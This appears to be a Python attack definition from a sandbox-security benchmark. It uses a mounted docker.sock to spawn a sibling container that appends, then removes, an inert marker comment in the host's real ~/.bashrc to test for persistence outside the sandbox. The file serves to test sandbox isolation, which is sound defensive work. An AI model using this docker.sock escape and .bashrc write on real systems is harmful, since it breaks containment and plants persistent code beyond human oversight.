"""Persistence via a shell rc file (LINUX.md catalogue: "Write to ~/.bashrc ...
outside the sandbox"). Reuses the exact escape vector already proven in
escape_docker_socket.py (a mounted docker.sock lets anything inside the
sandbox ask the HOST's real Docker daemon to spawn a sibling container with
arbitrary host bind-mounts) -- the difference here is WHERE the sibling
container writes: the real bench account's ~/.bashrc on the VM host, which
would execute on every future interactive login, not a one-off escape marker
touch. That's the actual persistence risk this category measures: a write
that survives and re-triggers later, not just a single successful escape.

The appended line is a bare `#` comment -- inert even if something went wrong
and it were never removed, it can never execute anything if .bashrc were ever
sourced. The same sibling-container command removes it again immediately
after touching the escape marker (verified live: a byte-for-byte md5sum of
~/.bashrc before and after matches), so this never leaves a lasting trace on
the VM even within one benchmarking session, well before any snapshot reset
would wipe it anyway.
"""
from .base import Attack

ATTACK = Attack(
    name="persist_bashrc",
    category="persistence",
    description="Use a mounted docker.sock to append (then remove) a marker line in the real ~/.bashrc, outside the sandbox",
    targets=("docker", "gvisor"),  # same scope as escape_docker_socket -- see that module's docstring
    command=(
        "timeout {timeout_margin} docker run --rm "
        "-v /home/bench:/host_home -v /var/sbx-bench:/var/sbx-bench alpine:3.20 sh -c "
        "'echo \"# sbx-bench-persist-marker\" >> /host_home/.bashrc && "
        "touch {escape_marker} && "
        "sed -i \"/sbx-bench-persist-marker/d\" /host_home/.bashrc'"
    ),
    config={
        "volumes": {"/var/run/docker.sock": "/var/run/docker.sock"},
        "image": "docker:27-cli",
    },
    timeout=20.0,
    notes=(
        "Misconfigured variant by construction, same as escape_docker_socket -- "
        "the config IS the vulnerability. Negative control (config=None): no "
        "docker client in the default image at all, fails outright before it "
        "can even attempt the mount.\n"
        "Verified live on sbx-test: the appended comment line lands in the real "
        "/home/bench/.bashrc, the escape marker gets touched, then the line is "
        "removed by the same command -- md5sum of .bashrc before and after "
        "matched exactly."
    ),
)
